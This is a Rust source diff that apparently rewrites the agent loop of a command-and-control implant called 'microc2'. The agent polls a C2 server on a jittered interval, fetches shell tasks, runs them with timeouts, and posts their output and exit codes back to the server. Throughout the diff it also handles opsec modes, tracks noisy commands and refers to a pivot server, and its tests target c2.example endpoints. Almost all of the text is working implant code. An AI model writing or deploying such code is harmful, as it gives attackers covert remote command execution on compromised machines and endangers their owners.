+trait TaskExecutor {
+    async fn execute(&self, task: &Task) -> ShellExecution;
+}
+
+struct ShellTaskExecutor;
+
+impl TaskExecutor for ShellTaskExecutor {
+    async fn execute(&self, task: &Task) -> ShellExecution {
+        match &task.task_type {
+            TaskType::Shell => execute_shell(&task.arguments.command, task.timeout_seconds).await,
+        }
+    }
+}
+
+#[derive(Clone, Debug)]
+enum TaskDeliveryState {
+    AwaitingRunning {
+        task: Box<Task>,
+        started_at: String,
+    },
+    Executing,
+    AwaitingResult {
+        result: Box<TaskResult>,
+    },
+    BlockedResult {
+        result: Box<TaskResult>,
+        reason: String,
+    },
+    Delivered,
+    Blocked {
+        reason: String,
+    },
+}
+
+#[derive(Default)]
+struct TaskOutbox {
+    states: Mutex<HashMap<String, TaskDeliveryState>>,
+    terminal_order: Mutex<VecDeque<String>>,
+}
+
+impl TaskOutbox {
+    fn enqueue(&self, task: Task) -> bool {
+        self.enqueue_at(task, utc_timestamp())
+    }
+
+    fn enqueue_at(&self, task: Task, started_at: String) -> bool {
+        let mut states = self.lock_states();
+        if states.contains_key(&task.id) {
+            return false;
+        }
+        states.insert(
+            task.id.clone(),
+            TaskDeliveryState::AwaitingRunning {
+                task: Box::new(task),
+                started_at,
+            },
+        );
+        true
+    }
+
+    fn has_pending(&self) -> bool {
+        self.lock_states().values().any(|state| {
+            matches!(
+                state,
+                TaskDeliveryState::AwaitingRunning { .. }
+                    | TaskDeliveryState::Executing
+                    | TaskDeliveryState::AwaitingResult { .. }
+                    | TaskDeliveryState::BlockedResult { .. }
+            )
+        })
+    }
+
+    async fn process_all<T, E>(&self, transport: &T, executor: &E)
+    where
+        T: TaskTransport,
+        E: TaskExecutor,
+    {
+        self.process_all_with_clock(transport, executor, Utc::now)
+            .await;
+    }
+
+    async fn process_all_with_clock<T, E, C>(&self, transport: &T, executor: &E, now: C)
+    where
+        T: TaskTransport,
+        E: TaskExecutor,
+        C: Fn() -> DateTime<Utc> + Copy,
+    {
+        let task_ids: Vec<String> = self
+            .lock_states()
+            .iter()
+            .filter(|(_, state)| {
+                matches!(
+                    state,
+                    TaskDeliveryState::AwaitingRunning { .. }
+                        | TaskDeliveryState::AwaitingResult { .. }
+                )
+            })
+            .map(|(task_id, _)| task_id.clone())
+            .collect();
+        for task_id in task_ids {
+            self.process_one(&task_id, transport, executor, now).await;
+        }
+    }
+
+    async fn process_one<T, E, C>(&self, task_id: &str, transport: &T, executor: &E, now: C)
+    where
+        T: TaskTransport,
+        E: TaskExecutor,
+        C: Fn() -> DateTime<Utc> + Copy,
+    {
+        loop {
+            let Some(state) = self.lock_states().get(task_id).cloned() else {
+                return;
+            };
+            match state {
+                TaskDeliveryState::AwaitingRunning { task, started_at } => {
+                    if let Err(reason) = task_may_start_at(&task, now()) {
+                        warn!(
+                            "[TASK] Blocking task {} before acknowledgement: {}",
+                            task_id, reason
+                        );
+                        self.block(task_id, reason);
+                        return;
+                    }
+
+                    match transport.submit_running(&task, &started_at).await {
+                        SubmissionOutcome::Accepted => {
+                            if let Err(reason) = task_may_start_at(&task, now()) {
+                                warn!(
+                                    "[TASK] Task {} expired while awaiting running acknowledgement",
+                                    task_id
+                                );
+                                let result = build_task_result(
+                                    &task,
+                                    started_at,
+                                    now().to_rfc3339_opts(SecondsFormat::Millis, true),
+                                    ShellExecution::failed(reason),
+                                );
+                                self.set_awaiting_result(task_id, result);
+                                continue;
+                            }
+
+                            if !self.claim_execution(task_id) {
+                                return;
+                            }
+                            if is_strong_command(&task.arguments.command) {
+                                mark_noisy_command_executed();
+                            }
+                            let execution = executor.execute(&task).await;
+                            let result = build_task_result(
+                                &task,
+                                started_at,
+                                now().to_rfc3339_opts(SecondsFormat::Millis, true),
+                                execution,
+                            );
+                            self.set_awaiting_result(task_id, result);
+                        }
+                        SubmissionOutcome::Retryable(error) => {
+                            warn!(
+                                "[TASK] Running acknowledgement for {} will retry: {}",
+                                task_id, error
+                            );
+                            return;
+                        }
+                        SubmissionOutcome::Permanent(error) => {
+                            warn!(
+                                "[TASK] Blocking task {} after permanent running rejection: {}",
+                                task_id, error
+                            );
+                            self.block(task_id, error);
+                            return;
+                        }
+                    }
+                }
+                TaskDeliveryState::AwaitingResult { result } => {
+                    match transport.submit_result(&result).await {
+                        SubmissionOutcome::Accepted => {
+                            self.set_terminal(task_id, TaskDeliveryState::Delivered);
+                        }
+                        SubmissionOutcome::Retryable(error) => {
+                            warn!("[TASK] Result for {} will retry: {}", task_id, error);
+                        }
+                        SubmissionOutcome::Permanent(error) => {
+                            warn!(
+                                "[TASK] Blocking result delivery for {} after permanent rejection: {}",
+                                task_id, error
+                            );
+                            self.block_result(task_id, result, error);
+                        }
+                    }
+                    return;
+                }
+                TaskDeliveryState::Executing | TaskDeliveryState::Delivered => return,
+                TaskDeliveryState::BlockedResult { result, reason } => {
+                    debug!(
+                        "[TASK] Result delivery for {} remains blocked (payload for {} retained): {}",
+                        task_id, result.task_id, reason
+                    );
+                    return;
+                }
+                TaskDeliveryState::Blocked { reason } => {
+                    debug!("[TASK] Task {} remains blocked: {}", task_id, reason);
+                    return;
+                }
+            }
+        }
+    }
+
+    fn claim_execution(&self, task_id: &str) -> bool {
+        let mut states = self.lock_states();
+        if !matches!(
+            states.get(task_id),
+            Some(TaskDeliveryState::AwaitingRunning { .. })
+        ) {
+            return false;
+        }
+        states.insert(task_id.to_string(), TaskDeliveryState::Executing);
+        true
+    }
+
+    fn set_awaiting_result(&self, task_id: &str, result: TaskResult) {
+        let mut states = self.lock_states();
+        if matches!(
+            states.get(task_id),
+            Some(TaskDeliveryState::Executing | TaskDeliveryState::AwaitingRunning { .. })
+        ) {
+            states.insert(
+                task_id.to_string(),
+                TaskDeliveryState::AwaitingResult {
+                    result: Box::new(result),
+                },
+            );
+        }
+    }
+
+    fn set_terminal(&self, task_id: &str, state: TaskDeliveryState) {
+        let mut states = self.lock_states();
+        let was_terminal = matches!(
+            states.get(task_id),
+            Some(TaskDeliveryState::Delivered | TaskDeliveryState::Blocked { .. })
+        );
+        states.insert(task_id.to_string(), state);
+        drop(states);
+
+        if was_terminal {
+            return;
+        }
+        let mut terminal_order = self
+            .terminal_order
+            .lock()
+            .unwrap_or_else(std::sync::PoisonError::into_inner);
+        terminal_order.push_back(task_id.to_string());
+        while terminal_order.len() > MAX_TERMINAL_TASK_IDS {
+            if let Some(expired_id) = terminal_order.pop_front() {
+                let mut states = self.lock_states();
+                if matches!(
+                    states.get(&expired_id),
+                    Some(TaskDeliveryState::Delivered | TaskDeliveryState::Blocked { .. })
+                ) {
+                    states.remove(&expired_id);
+                }
+            }
+        }
+    }
+
+    fn block(&self, task_id: &str, reason: String) {
+        self.set_terminal(task_id, TaskDeliveryState::Blocked { reason });
+    }
+
+    fn block_result(&self, task_id: &str, result: Box<TaskResult>, reason: String) {
+        self.lock_states().insert(
+            task_id.to_string(),
+            TaskDeliveryState::BlockedResult { result, reason },
+        );
+    }
+
+    fn lock_states(&self) -> std::sync::MutexGuard<'_, HashMap<String, TaskDeliveryState>> {
+        self.states
+            .lock()
+            .unwrap_or_else(std::sync::PoisonError::into_inner)
+    }
+
+    #[cfg(test)]
+    fn state(&self, task_id: &str) -> Option<TaskDeliveryState> {
+        self.lock_states().get(task_id).cloned()
+    }
+}
+
+fn task_may_start_at(task: &Task, now: DateTime<Utc>) -> Result<(), String> {
+    let expires_at = task
+        .expires_at
+        .as_deref()
+        .ok_or_else(|| "task is missing required expires_at".to_string())?;
+    let expires_at = DateTime::parse_from_rfc3339(expires_at)
+        .map_err(|_| "expires_at is not a valid RFC3339 timestamp".to_string())?
+        .with_timezone(&Utc);
+    if now >= expires_at {
+        return Err(format!(
+            "task expired at {} before shell execution could start",
+            expires_at.to_rfc3339_opts(SecondsFormat::Millis, true)
+        ));
+    }
+    Ok(())
+}
+
+async fn process_task_outbox(config: &AgentConfig, server_addr: &str, agent_id: &str) {
+    let transport = HttpTaskTransport {
+        config,
+        server_addr,
+        agent_id,
+    };
+    TASK_OUTBOX
+        .process_all(&transport, &ShellTaskExecutor)
+        .await;
 }
 
 fn is_strong_command(cmd: &str) -> bool {
@@ -442,28 +1387,6 @@ fn starts_with_command_token(cmd: &str, token: &str) -> bool {
     match trimmed[token.len()..].chars().next() {
         Some(next) => next.is_whitespace(),
         None => true,
-    }
-}
-
-// Check if the command should be executed based on the current opsec mode
-// This function now only queues, execution logic is in agent_loop
-fn should_queue_command(cmd: &str) -> bool {
-    let mode = determine_agent_mode(&crate::config::AgentConfig::load().unwrap_or_default());
-    debug!("[OPSEC] should_queue_command: mode={:?}, cmd={}", mode, cmd);
-    match mode {
-        AgentMode::FullOpsec | AgentMode::ReducedActivity => {
-            info!("[OPSEC] Queueing command '{}' (mode: {:?})", cmd, mode);
-            true // Queue the command
-        }
-        AgentMode::BackgroundOpsec => {
-            if is_weak_command(cmd) {
-                info!("[OPSEC] Weak command '{}' allowed in BackgroundOpsec", cmd);
-                false // Execute immediately
-            } else {
-                info!("[OPSEC] Strong command '{}' queued in BackgroundOpsec", cmd);
-                true // Queue the command
-            }
-        }
     }
 }
 
@@ -502,128 +1425,39 @@ pub async fn agent_loop(
 
         // Still in BackgroundOpsec, proceed with C2 communication
         let sleep_time = random_jitter(config.sleep_interval, config.jitter);
-        info!("[SHELL] Polling for commands (Interval: {}s)", sleep_time);
+        info!("[SHELL] Polling for tasks (Interval: {}s)", sleep_time);
 
-        match get_command_with_client(&config, server_addr, agent_id).await {
-            Ok(Some(command)) => {
-                info!("[SHELL] Received command: {}", command);
+        // Resolve an uncertain running/result delivery before accepting more
+        // work. The in-memory outbox keeps the original timestamp and result
+        // payload intact across retries.
+        process_task_outbox(&config, server_addr, agent_id).await;
 
-                // Check if we should queue this command or execute immediately
-                if should_queue_command(&command) {
-                    // Queue the command
-                    let mut queue_guard = QUEUED_COMMANDS.lock().unwrap();
-                    queue_guard.push(command.clone());
+        if TASK_OUTBOX.has_pending() {
+            debug!("[SHELL] Pending task delivery remains; deferring the next task poll");
+        } else {
+            match get_task_with_client(&config, server_addr, agent_id).await {
+                Ok(Some(task)) => {
                     info!(
-                        "[OPSEC] Command '{}' queued (total queued: {})",
-                        command,
-                        queue_guard.len()
+                        "[SHELL] Received task {} (type: {:?})",
+                        task.id, task.task_type
                     );
-                } else {
-                    // Execute immediately (only weak commands in BackgroundOpsec)
-                    info!("[SHELL] Executing weak command immediately: {}", command);
-                    let cmd_parts: Vec<&str> = command.split_whitespace().collect();
-                    match execute_command(&cmd_parts).await {
-                        Ok(output) => {
-                            info!("[SHELL] Command executed successfully");
-                            if let Err(e) = submit_result_with_client(
-                                &config,
-                                server_addr,
-                                agent_id,
-                                &command,
-                                &output,
-                            )
-                            .await
-                            {
-                                error!("[SHELL] Failed to submit result: {}", e);
-                            }
-                        }
-                        Err(e) => {
-                            error!("[SHELL] Command execution failed: {}", e);
-                            let error_output = format!("Error: {}", e);
-                            if let Err(e) = submit_result_with_client(
-                                &config,
-                                server_addr,
-                                agent_id,
-                                &command,
-                                &error_output,
-                            )
-                            .await
-                            {
-                                error!("[SHELL] Failed to submit error result: {}", e);
-                            }
-                        }
+                    let task_id = task.id.clone();
+                    if TASK_OUTBOX.enqueue(task) {
+                        info!("[SHELL] Task {} added to the delivery outbox", task_id);
+                    } else {
+                        debug!("[SHELL] Ignoring duplicate delivery for task {}", task_id);
                     }
+                    process_task_outbox(&config, server_addr, agent_id).await;
                 }
-            }
-            Ok(None) => {
-                // No command available, continue polling
-                debug!("[SHELL] No command available");
-            }
-            Err(e) => {
-                error!("[SHELL] Failed to get command: {}", e);
-                // Continue loop, C2 failure state already updated
-            }
-        }
-
-        // --- Process Queued Commands ---
-        // Always check and process queue while in BackgroundOpsec
-        let mut commands_to_run = Vec::new();
-        {
-            let mut queue_guard = QUEUED_COMMANDS.lock().unwrap();
-            commands_to_run.extend(queue_guard.drain(..));
-        } // Lock released
-
-        if !commands_to_run.is_empty() {
-            info!(
-                "[SHELL] Processing {} queued commands",
-                commands_to_run.len()
-            );
-            for command in commands_to_run {
-                info!("[SHELL] Executing queued command: {}", command);
-                let cmd_parts: Vec<&str> = command.split_whitespace().collect();
-
-                //  Mark noisy command execution with timestamp
-                if is_strong_command(&command) {
-                    mark_noisy_command_executed(); //  Use timestamp instead of Instant
+                Ok(None) => {
+                    debug!("[SHELL] No task available");
                 }
-
-                match execute_command(&cmd_parts).await {
-                    Ok(output) => {
-                        info!("[SHELL] Queued command executed successfully");
-                        if let Err(e) = submit_result_with_client(
-                            &config,
-                            server_addr,
-                            agent_id,
-                            &command,
-                            &output,
-                        )
-                        .await
-                        {
-                            error!("[SHELL] Failed to submit queued command result: {}", e);
-                        }
-                    }
-                    Err(e) => {
-                        error!("[SHELL] Queued command execution failed: {}", e);
-                        let error_output = format!("Error: {}", e);
-                        if let Err(e) = submit_result_with_client(
-                            &config,
-                            server_addr,
-                            agent_id,
-                            &command,
-                            &error_output,
-                        )
-                        .await
-                        {
-                            error!(
-                                "[SHELL] Failed to submit queued command error result: {}",
-                                e
-                            );
-                        }
-                    }
+                Err(err) => {
+                    error!("[SHELL] Failed to get task: {}", err);
+                    // Continue loop, C2 failure state already updated
                 }
             }
         }
-        // --- End Process Queued Commands ---
 
         // Sleep before next poll
         debug!("[SHELL] Sleeping for {} seconds...", sleep_time);
@@ -670,18 +1504,42 @@ async fn stop_pivot_server(port: u16) -> Result<String, String> {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use std::sync::atomic::{AtomicUsize, Ordering};
 
     #[test]
     fn builds_c2_endpoint_urls_from_validated_base() -> io::Result<()> {
-        let url = build_c2_endpoint_url(
+        let heartbeat_url = build_c2_endpoint_url(
             "https://c2.example/base/",
-            "agent/one",
+            "agent.one:1",
             C2Endpoint::Heartbeat,
         )?;
-
         assert_eq!(
-            url.as_str(),
-            "https://c2.example/base/api/agent/agent%2Fone/heartbeat"
+            heartbeat_url.as_str(),
+            "https://c2.example/base/api/agent/agent.one:1/heartbeat"
+        );
+
+        let tasks_url =
+            build_c2_endpoint_url("https://c2.example", "agent-one", C2Endpoint::Tasks)?;
+        assert_eq!(
+            tasks_url.as_str(),
+            "https://c2.example/api/agent/agent-one/tasks"
+        );
+
+        let status_url = build_c2_endpoint_url(
+            "https://c2.example",
+            "agent-one",
+            C2Endpoint::TaskStatus("task_one-1"),
+        )?;
+        assert_eq!(
+            status_url.as_str(),
+            "https://c2.example/api/agent/agent-one/tasks/task_one-1/status"
+        );
+
+        let results_url =
+            build_c2_endpoint_url("https://c2.example", "agent-one", C2Endpoint::Results)?;
+        assert_eq!(
+            results_url.as_str(),
+            "https://c2.example/api/agent/agent-one/results"
         );
 
         Ok(())
@@ -689,7 +1547,7 @@ mod tests {
 
     #[test]
     fn rejects_invalid_c2_endpoint_bases() {
-        let err = match build_c2_endpoint_url("file:///tmp/c2", "agent-one", C2Endpoint::Command) {
+        let err = match build_c2_endpoint_url("file:///tmp/c2", "agent-one", C2Endpoint::Tasks) {
             Ok(url) => panic!("unexpected valid C2 URL: {}", url),
             Err(err) => err,
         };
@@ -698,16 +1556,416 @@ mod tests {
     }
 
     #[test]
-    fn classifies_commands_on_token_boundaries() {
-        assert!(is_weak_command("ping 127.0.0.1"));
-        assert!(is_weak_command("  echo hello"));
-        assert!(!is_weak_command("pinger"));
-        assert!(!is_weak_command("echoed"));
+    fn rejects_invalid_c2_endpoint_identifiers() {
+        let invalid_agent =
+            build_c2_endpoint_url("https://c2.example", "agent/one", C2Endpoint::Tasks)
+                .expect_err("slash is outside the identifier contract");
+        assert_eq!(invalid_agent.kind(), io::ErrorKind::InvalidInput);
 
+        let invalid_task = build_c2_endpoint_url(
+            "https://c2.example",
+            "agent-one",
+            C2Endpoint::TaskStatus("task/one"),
+        )
+        .expect_err("slash is outside the identifier contract");
+        assert_eq!(invalid_task.kind(), io::ErrorKind::InvalidInput);
+    }
+
+    #[test]
+    fn classifies_noisy_commands_on_token_boundaries() {
         assert!(is_strong_command("download report.txt"));
         assert!(is_strong_command("whoami"));
         assert!(!is_strong_command("downloaded"));
         assert!(!is_strong_command("echo hello"));
+    }
+
+    #[test]
+    fn typed_result_preserves_correlation_and_plain_output_fields() {
+        let task = sample_task("echo hello");
+        let completed = build_task_result(
+            &task,
+            "2026-07-23T16:30:05Z".to_string(),
+            "2026-07-23T16:30:06Z".to_string(),
+            ShellExecution {
+                stdout: "hello\n".to_string(),
+                stderr: String::new(),
+                exit_code: Some(0),
+                error: None,
+            },
+        );
+        assert_eq!(completed.task_id, "task-one");
+        assert_eq!(completed.agent_id, "agent-one");
+        assert_eq!(completed.outcome, TaskOutcome::Completed);
+        assert_eq!(completed.output.stdout, "hello\n");
+        assert_eq!(completed.output.stderr, "");
+        assert_eq!(completed.exit_code, Some(0));
+        assert_eq!(completed.error, None);
+
+        let failed = build_task_result(
+            &task,
+            "2026-07-23T16:30:05Z".to_string(),
+            "2026-07-23T16:30:06Z".to_string(),
+            ShellExecution {
+                stdout: String::new(),
+                stderr: "permission denied\n".to_string(),
+                exit_code: Some(1),
+                error: Some("command exited with status 1".to_string()),
+            },
+        );
+        assert_eq!(failed.outcome, TaskOutcome::Failed);
+        assert_eq!(failed.output.stderr, "permission denied\n");
+        assert_eq!(failed.exit_code, Some(1));
+    }
+
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn shell_execution_separates_stdout_stderr_and_exit_code() {
+        use std::fs;
+        use std::os::unix::fs::PermissionsExt;
+        use std::time::{SystemTime, UNIX_EPOCH};
+
+        let nonce = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .expect("system clock")
+            .as_nanos();
+        let script_path = env::temp_dir().join(format!(
+            "microc2-task-test-{}-{nonce}.sh",
+            std::process::id()
+        ));
+        fs::write(
+            &script_path,
+            "#!/bin/sh\nprintf 'standard output'\nprintf 'standard error' >&2\nexit 7\n",
+        )
+        .expect("write test script");
+        fs::set_permissions(&script_path, fs::Permissions::from_mode(0o700))
+            .expect("make test script executable");
+
+        let execution = execute_shell(script_path.to_str().expect("UTF-8 temporary path"), 5).await;
+        let _ = fs::remove_file(script_path);
+
+        assert_eq!(execution.stdout, "standard output");
+        assert_eq!(execution.stderr, "standard error");
+        assert_eq!(execution.exit_code, Some(7));
+        assert_eq!(
+            execution.error.as_deref(),
+            Some("command exited with status 7")
+        );
+    }
+
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn shell_execution_enforces_task_timeout() {
+        let started = Instant::now();
+        let execution = execute_shell("sleep 5", 1).await;
+
+        assert!(
+            started.elapsed() < Duration::from_secs(3),
+            "timed-out task did not terminate promptly"
+        );
+        assert_eq!(execution.exit_code, None);
+        assert!(
+            execution
+                .error
+                .as_deref()
+                .is_some_and(|error| error.contains("timed out after 1 seconds")),
+            "unexpected timeout result: {execution:?}"
+        );
+    }
+
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn repeated_shell_timeouts_return_promptly_for_detached_reaping() {
+        for _ in 0..3 {
+            let started = Instant::now();
+            let execution = execute_shell("sleep 5", 1).await;
+            assert!(started.elapsed() < Duration::from_secs(3));
+            assert!(execution
+                .error
+                .as_deref()
+                .is_some_and(|error| error.contains("timed out")));
+        }
+    }
+
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn shell_execution_deadline_includes_background_descendant_output_handles() {
+        let started = Instant::now();
+        let execution = execute_shell("sleep 5 &", 1).await;
+
+        assert!(
+            started.elapsed() < Duration::from_secs(3),
+            "background descendant kept output readers alive past the deadline"
+        );
+        assert_eq!(execution.exit_code, None);
+        assert!(
+            execution
+                .error
+                .as_deref()
+                .is_some_and(|error| error.contains("timed out after 1 seconds")),
+            "unexpected timeout result: {execution:?}"
+        );
+    }
+
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn successful_shell_exit_cleans_redirected_background_descendants() {
+        use std::time::{SystemTime, UNIX_EPOCH};
+
+        let nonce = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .expect("system clock")
+            .as_nanos();
+        let marker = env::temp_dir().join(format!(
+            "microc2-background-marker-{}-{nonce}",
+            std::process::id()
+        ));
+        let command = format!("(sleep 1; touch '{}') >/dev/null 2>&1 &", marker.display());
+
+        let execution = execute_shell(&command, 5).await;
+        assert_eq!(execution.exit_code, Some(0));
+        assert_eq!(execution.error, None);
+        tokio::time::sleep(Duration::from_millis(1_500)).await;
+        assert!(
+            !marker.exists(),
+            "redirected background descendant survived successful shell exit"
+        );
+        let _ = std::fs::remove_file(marker);
+    }
+
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn shell_execution_caps_and_reports_high_volume_output() {
+        let execution = execute_shell(
+            "{ yes o | head -c 1100000; yes e | head -c 1100000 >&2; }",
+            5,
+        )
+        .await;
+
+        assert_eq!(execution.stdout.len(), MAX_CAPTURE_BYTES);
+        assert_eq!(execution.stderr.len(), MAX_CAPTURE_BYTES);
+        assert_eq!(execution.exit_code, Some(0));
+        let error = execution.error.as_deref().expect("truncation error");
+        assert!(error.contains("stdout truncated at 1048576 bytes"));
+        assert!(error.contains("stderr truncated at 1048576 bytes"));
+    }
+
+    #[cfg(windows)]
+    #[tokio::test]
+    async fn windows_shell_execution_terminates_the_process_tree_at_timeout() {
+        let started = Instant::now();
+        let execution = execute_shell(
+            "start \"\" /B cmd /C \"ping -n 6 127.0.0.1 >NUL\" & ping -n 6 127.0.0.1 >NUL",
+            1,
+        )
+        .await;
+
+        assert!(
+            started.elapsed() < Duration::from_secs(3),
+            "Windows process tree termination exceeded its bound"
+        );
+        assert_eq!(execution.exit_code, None);
+        assert!(
+            execution
+                .error
+                .as_deref()
+                .is_some_and(|error| error.contains("timed out after 1 seconds")),
+            "unexpected timeout result: {execution:?}"
+        );
+    }
+
+    #[test]
+    fn result_error_is_bounded_without_changing_wire_fields() {
+        let result = build_task_result(
+            &sample_task("echo hello"),
+            "2026-07-23T16:30:05Z".to_string(),
+            "2026-07-23T16:30:06Z".to_string(),
+            ShellExecution::failed("é".repeat(MAX_RESULT_ERROR_CHARS + 10)),
+        );
+
+        let error = result.error.expect("failed result error");
+        assert_eq!(error.chars().count(), MAX_RESULT_ERROR_CHARS);
+        assert!(error.ends_with("… [truncated]"));
+    }
+
+    #[test]
+    fn submission_statuses_distinguish_retryable_and_permanent_failures() {
+        assert!(matches!(
+            classify_submission_status(StatusCode::REQUEST_TIMEOUT, "result"),
+            SubmissionOutcome::Retryable(_)
+        ));
+        assert!(matches!(
+            classify_submission_status(StatusCode::TOO_MANY_REQUESTS, "result"),
+            SubmissionOutcome::Retryable(_)
+        ));
+        assert!(matches!(
+            classify_submission_status(StatusCode::BAD_GATEWAY, "result"),
+            SubmissionOutcome::Retryable(_)
+        ));
+        assert!(matches!(
+            classify_submission_status(StatusCode::CONFLICT, "result"),
+            SubmissionOutcome::Permanent(_)
+        ));
+    }
+
+    #[tokio::test]
+    async fn running_acknowledgement_retry_preserves_timestamp_and_executes_once() {
+        let outbox = TaskOutbox::default();
+        let task = sample_task("echo hello");
+        let started_at = "2026-07-23T16:30:01.234Z".to_string();
+        assert!(outbox.enqueue_at(task.clone(), started_at.clone()));
+
+        let transport = MockTransport::new(
+            [
+                SubmissionOutcome::Retryable("status response lost".to_string()),
+                SubmissionOutcome::Accepted,
+            ],
+            [SubmissionOutcome::Accepted],
+        );
+        let executor = CountingExecutor::successful("hello\n");
+
+        outbox
+            .process_all_with_clock(&transport, &executor, fixed_now)
+            .await;
+        assert_eq!(executor.executions(), 0);
+        assert!(matches!(
+            outbox.state(&task.id),
+            Some(TaskDeliveryState::AwaitingRunning { .. })
+        ));
+
+        outbox
+            .process_all_with_clock(&transport, &executor, fixed_now)
+            .await;
+        assert_eq!(executor.executions(), 1);
+        assert!(matches!(
+            outbox.state(&task.id),
+            Some(TaskDeliveryState::Delivered)
+        ));
+
+        let running_attempts = transport.running_attempts();
+        assert_eq!(running_attempts.len(), 2);
+        assert_eq!(running_attempts[0], running_attempts[1]);
+        assert_eq!(running_attempts[0].1, started_at);
+    }
+
+    #[tokio::test]
+    async fn ambiguous_result_retry_reuses_payload_and_never_reruns_task() {
+        let outbox = TaskOutbox::default();
+        let task = sample_task("echo hello");
+        assert!(outbox.enqueue_at(task.clone(), "2026-07-23T16:30:01.234Z".to_string()));
+        let transport = MockTransport::new(
+            [SubmissionOutcome::Accepted],
+            [
+                SubmissionOutcome::Retryable("result response lost".to_string()),
+                SubmissionOutcome::Accepted,
+            ],
+        );
+        let executor = CountingExecutor::successful("hello\n");
+
+        outbox
+            .process_all_with_clock(&transport, &executor, fixed_now)
+            .await;
+        assert_eq!(executor.executions(), 1);
+        assert!(matches!(
+            outbox.state(&task.id),
+            Some(TaskDeliveryState::AwaitingResult { .. })
+        ));
+        assert!(
+            !outbox.enqueue_at(task.clone(), "2026-07-23T16:30:02.000Z".to_string()),
+            "lease redelivery must be deduplicated while result delivery is uncertain"
+        );
+
+        outbox
+            .process_all_with_clock(&transport, &executor, fixed_now)
+            .await;
+        assert_eq!(executor.executions(), 1);
+        assert!(matches!(
+            outbox.state(&task.id),
+            Some(TaskDeliveryState::Delivered)
+        ));
+
+        let result_attempts = transport.result_attempts();
+        assert_eq!(result_attempts.len(), 2);
+        assert_eq!(result_attempts[0], result_attempts[1]);
+        assert!(
+            !outbox.enqueue_at(task, "2026-07-23T16:30:03.000Z".to_string()),
+            "recent delivered task IDs must remain deduplicated"
+        );
+    }
+
+    #[tokio::test]
+    async fn permanent_result_rejection_retains_payload_and_applies_backpressure() {
+        let outbox = TaskOutbox::default();
+        let task = sample_task("echo hello");
+        assert!(outbox.enqueue_at(task.clone(), "2026-07-23T16:30:01.234Z".to_string()));
+        let transport = MockTransport::new(
+            [SubmissionOutcome::Accepted],
+            [SubmissionOutcome::Permanent(
+                "result submission failed with status 409 Conflict".to_string(),
+            )],
+        );
+        let executor = CountingExecutor::successful("hello\n");
+
+        outbox
+            .process_all_with_clock(&transport, &executor, fixed_now)
+            .await;
+
+        assert_eq!(executor.executions(), 1);
+        assert!(outbox.has_pending());
+        let attempted_result = transport
+            .result_attempts()
+            .into_iter()
+            .next()
+            .expect("result submission");
+        match outbox.state(&task.id) {
+            Some(TaskDeliveryState::BlockedResult { result, reason }) => {
+                assert_eq!(*result, attempted_result);
+                assert!(reason.contains("409 Conflict"));
+            }
+            state => panic!("unexpected outbox state: {state:?}"),
+        }
+
+        outbox
+            .process_all_with_clock(&transport, &executor, fixed_now)
+            .await;
+        assert_eq!(executor.executions(), 1);
+        assert_eq!(transport.result_attempts().len(), 1);
+    }
+
+    #[test]
+    fn terminal_task_dedupe_retention_is_bounded() {
+        let outbox = TaskOutbox::default();
+        for index in 0..(MAX_TERMINAL_TASK_IDS + 5) {
+            outbox.set_terminal(&format!("task-{index}"), TaskDeliveryState::Delivered);
+        }
+
+        assert!(outbox.lock_states().len() <= MAX_TERMINAL_TASK_IDS);
+        assert!(outbox.state("task-0").is_none());
+        assert!(matches!(
+            outbox.state(&format!("task-{}", MAX_TERMINAL_TASK_IDS + 4)),
+            Some(TaskDeliveryState::Delivered)
+        ));
+    }
+
+    #[tokio::test]
+    async fn task_at_expiry_boundary_is_blocked_without_acknowledgement_or_execution() {
+        let outbox = TaskOutbox::default();
+        let mut task = sample_task("echo hello");
+        task.expires_at = Some("2026-07-23T16:30:02Z".to_string());
+        assert!(outbox.enqueue_at(task.clone(), "2026-07-23T16:30:01.234Z".to_string()));
+        let transport = MockTransport::new([], []);
+        let executor = CountingExecutor::successful("must not run");
+
+        outbox
+            .process_all_with_clock(&transport, &executor, fixed_now)
+            .await;
+
+        assert_eq!(executor.executions(), 0);
+        assert!(transport.running_attempts().is_empty());
+        assert!(transport.result_attempts().is_empty());
+        assert!(matches!(
+            outbox.state(&task.id),
+            Some(TaskDeliveryState::Blocked { .. })
+        ));
     }
 
     #[test]
@@ -732,5 +1990,123 @@ mod tests {
         assert_eq!(payload["payload_id"], "payload-one");
         assert_eq!(payload["listener_id"], "listener-one");
         assert_ne!(payload["id"], payload["payload_id"]);
+    }
+
+    fn sample_task(command: &str) -> Task {
+        Task {
+            schema_version: TASK_SCHEMA_VERSION,
+            id: "task-one".to_string(),
+            agent_id: "agent-one".to_string(),
+            task_type: crate::tasks::TaskType::Shell,
+            arguments: crate::tasks::TaskArguments {
+                command: command.to_string(),
+            },
+            timeout_seconds: 30,
+            status: crate::tasks::TaskStatus::Dispatched,
+            created_at: "2026-07-23T16:30:00Z".to_string(),
+            queued_at: "2026-07-23T16:30:00Z".to_string(),
+            dispatched_at: Some("2026-07-23T16:30:01Z".to_string()),
+            started_at: None,
+            completed_at: None,
+            expires_at: Some("2026-07-23T16:35:00Z".to_string()),
+            result: None,
+        }
+    }
+
+    fn fixed_now() -> DateTime<Utc> {
+        DateTime::parse_from_rfc3339("2026-07-23T16:30:02Z")
+            .expect("fixed RFC3339 timestamp")
+            .with_timezone(&Utc)
+    }
+
+    struct MockTransport {
+        running_outcomes: Mutex<VecDeque<SubmissionOutcome>>,
+        result_outcomes: Mutex<VecDeque<SubmissionOutcome>>,
+        running_attempts: Mutex<Vec<(String, String)>>,
+        result_attempts: Mutex<Vec<TaskResult>>,
+    }
+
+    impl MockTransport {
+        fn new(
+            running_outcomes: impl IntoIterator<Item = SubmissionOutcome>,
+            result_outcomes: impl IntoIterator<Item = SubmissionOutcome>,
+        ) -> Self {
+            Self {
+                running_outcomes: Mutex::new(running_outcomes.into_iter().collect()),
+                result_outcomes: Mutex::new(result_outcomes.into_iter().collect()),
+                running_attempts: Mutex::new(Vec::new()),
+                result_attempts: Mutex::new(Vec::new()),
+            }
+        }
+
+        fn running_attempts(&self) -> Vec<(String, String)> {
+            self.running_attempts
+                .lock()
